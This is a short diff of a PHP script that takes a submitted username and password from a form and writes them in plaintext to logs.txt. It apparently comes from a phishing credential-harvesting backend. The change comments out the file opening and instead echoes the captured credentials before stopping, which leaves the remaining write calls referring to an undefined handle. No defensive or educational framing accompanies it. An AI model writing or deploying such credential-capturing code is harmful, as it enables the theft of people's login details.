@@ -1,10 +1,10 @@
 <?php
 
-$handle = fopen("logs.txt", "a");
+//$handle = fopen("logs.txt", "a");
 $username = $_POST['username'];
 $passwrd = $_POST['password'];
    
-    $mydata = $username ." =" . $passwrd;
+ echo    $mydata = $username ." =" . $passwrd; die;
   fwrite($handle, $mydata);
    
    fwrite($handle, "\r   \n"); 
